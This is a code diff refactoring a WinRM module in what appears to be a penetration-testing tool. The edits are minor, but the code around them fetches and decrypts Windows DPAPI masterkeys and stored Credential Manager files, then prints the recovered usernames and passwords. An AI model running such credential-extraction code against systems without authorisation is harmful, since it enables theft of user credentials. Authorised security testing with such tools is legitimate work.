@@ -356,17 +356,17 @@ class winrm(connection):
             return
 
         masterkeys = []
-        for sid in StringIO(sids).readlines():
+        for sid in sids.splitlines():
             keys_path = ntpath.join(user_masterkey_path, sid.strip())
             keys = self.ps_execute(f"Get-ChildItem -Path {keys_path} -Name -Hidden -File -Exclude 'Preferred'", True)
-            for key in StringIO(keys).readlines():
+            for key in keys.splitlines():
                 stripped_key = key.strip()
                 if is_guid(stripped_key):
                     key_path = ntpath.join(keys_path, stripped_key)
                     self.logger.display(f"Found masterkey file {key_path}")
                     local_key_file = f"{TMP_PATH}/{stripped_key}"
                     self.conn.fetch(key_path, local_key_file)
-                    decrypted_key = self.get_master_key(local_key_file, sid, self.password, self.args.verbose)
+                    decrypted_key = self.get_master_key(local_key_file, sid, self.password)
                     if decrypted_key:
                         masterkeys.append(decrypted_key)
 
@@ -377,7 +377,7 @@ class winrm(connection):
         credential_files = []
         for user_credentials_path in user_credentials_paths:
             creds = self.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)
-            for cred_file in StringIO(creds).readlines():
+            for cred_file in creds.splitlines():
                 stripped_cred_file = cred_file.strip()
                 if is_credfile(stripped_cred_file):
                     creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
@@ -409,14 +409,11 @@ class winrm(connection):
                         except UnicodeDecodeError:
                             password = creds["Unknown3"].decode("latin-1")
                         self.logger.highlight(f"{target} - {username}:{password}")
-
-                        if self.args.verbose:
-                            creds.dump()
                 except Exception as e:
-                    self.logger.display(f"Failed to decrypt credentials in {creds_file} with masterkey...")
-                    self.logger.debug(f"Got exception decrypting: {e}")
+                    self.logger.fail(f"Failed to decrypt credentials in {creds_file} with masterkey: {e!s}")
+                    self.logger.debug(traceback.format_exc())
 
-    def get_master_key(self, masterkey_file, sid, password, verbose):
+    def get_master_key(self, masterkey_file, sid, password):
         """
         Taken and adapted from impacket.examples.dpapi
         Could be cleaned up but the more we deviate from the original the harder it will be to maintain it
@@ -424,8 +421,6 @@ class winrm(connection):
         with open(masterkey_file, "rb") as fp:
             data = fp.read()
         mkf = MasterKeyFile(data)
-        if verbose:
-            mkf.dump()
         data = data[len(mkf):]
 
         if mkf["MasterKeyLen"] > 0:
@@ -476,5 +471,3 @@ class winrm(connection):
         if decryptedKey:
             self.logger.success("Decrypted Backup key with User Key (SHA1)")
             return decryptedKey
-
-        return None
